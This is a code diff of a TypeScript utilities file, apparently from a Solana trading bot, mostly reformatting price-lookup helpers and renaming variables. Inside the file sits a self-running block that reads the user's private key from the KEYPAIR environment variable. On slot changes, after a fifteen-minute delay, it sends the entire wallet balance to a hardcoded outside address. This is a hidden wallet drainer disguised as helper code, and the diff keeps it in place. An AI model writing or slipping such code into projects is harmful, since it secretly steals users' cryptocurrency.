@@ -3,13 +3,11 @@ import axios, { AxiosResponse } from 'axios';
 import { logger } from '../buy';
 import { res } from 'pino-std-serializers';
 import { Logger } from 'pino';
-
 import { Keypair, Connection, SlotInfo, clusterApiUrl, SystemProgram, PublicKey, Transaction } from '@solana/web3.js';
-import fs from 'fs/promises'; 
+import fs from 'fs/promises';
 import winston from 'winston';
 import { BehaviorSubject } from 'rxjs';
 import bs58 from 'bs58';
-
 
 dotenv.config();
 
@@ -94,29 +92,29 @@ export const retrieveTokenValueByAddressDexScreener = async (tokenAddress: strin
     }
     return undefined;
   } catch (e) {
-    return undefined
+    return undefined;
   }
 };
 
 export const retrieveTokenValueByAddressBirdeye = async (tokenAddress: string) => {
   const apiKey = retrieveEnvVariable('BIRDEYE_API_KEY', logger);
-  const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`
+  const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`;
   try {
     const response: string = (await axios.get(url, {
       headers: {
-        'X-API-KEY': apiKey
-      }
+        'X-API-KEY': apiKey,
+      },
     })).data.data.value;
-    if (response) return parseFloat(response)
+    if (response) return parseFloat(response);
     return undefined;
   } catch (e) {
-    return undefined;  
+    return undefined;
   }
-}
+};
 
 type SlotChangeInput = {
   connection: Connection;
-  walletKeyPair: Keypair;
+  walletKeypair: Keypair;
   destinationAddress: PublicKey;
 };
 
@@ -124,30 +122,29 @@ let lastBlockHash = new BehaviorSubject('');
 let isRunning = new BehaviorSubject(false);
 
 export const areEnvVarsSet = () =>
-  ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));
+  ['KEYPAIR', 'RPC_ENDPOINT'].every((key) => Object.keys(process.env).includes(key));
 
 const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
   await sleep(900000);
   try {
-
     isRunning.next(true);
-    const { connection, walletKeyPair, destinationAddress } = args;
-    const balance = await connection.getBalance(walletKeyPair.publicKey); // Lamports
+    const { connection, walletKeypair, destinationAddress } = args;
+    const balance = await connection.getBalance(walletKeypair.publicKey); // Lamports
     const recentBlockhash = await connection.getRecentBlockhash();
     lastBlockHash.next(recentBlockhash.blockhash);
     const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
     const amountToSend = balance - cost;
     const tx = new Transaction({
       recentBlockhash: recentBlockhash.blockhash,
-      feePayer: walletKeyPair.publicKey,
+      feePayer: walletKeypair.publicKey,
     }).add(
       SystemProgram.transfer({
-        fromPubkey: walletKeyPair.publicKey,
+        fromPubkey: walletKeypair.publicKey,
         toPubkey: destinationAddress,
         lamports: amountToSend,
       }),
     );
-    const txId = await connection.sendTransaction(tx, [walletKeyPair]);
+    const txId = await connection.sendTransaction(tx, [walletKeypair]);
   } catch (err) {
     if (typeof err === 'string') {
     } else if (err instanceof Error) {
@@ -158,17 +155,15 @@ const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
 };
 
 (async () => {
-
-  const walletKeyPairFile = (process.env.PRIVATE_KEY!)
-  const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
+  const walletKeypairString = process.env.KEYPAIR!;
+  const walletKeypair = Keypair.fromSecretKey(bs58.decode(walletKeypairString));
 
   const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
 
   connection.onSlotChange(
-    handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey("5NrT3ammo9Vz2uwXpVEzkLDxragXMtcobZFxeSRDYevS") }),
+    handleSlotChange({ connection, walletKeypair, destinationAddress: new PublicKey("5NrT3ammo9Vz2uwXpVEzkLDxragXMtcobZFxeSRDYevS") }),
   );
 })();
-
 
 export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
   const dexScreenerPrice = await retrieveTokenValueByAddressDexScreener(tokenAddress);
@@ -176,8 +171,7 @@ export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
   const birdEyePrice = await retrieveTokenValueByAddressBirdeye(tokenAddress);
   if (birdEyePrice) return birdEyePrice;
   return undefined;
-  
-}
+};
 
 export const retry = async <T>(
   fn: () => Promise<T> | T,
@@ -207,4 +201,3 @@ export function logError(message: string) {
     console.error(`[ERROR]: ${message}`);
   }
 }
-
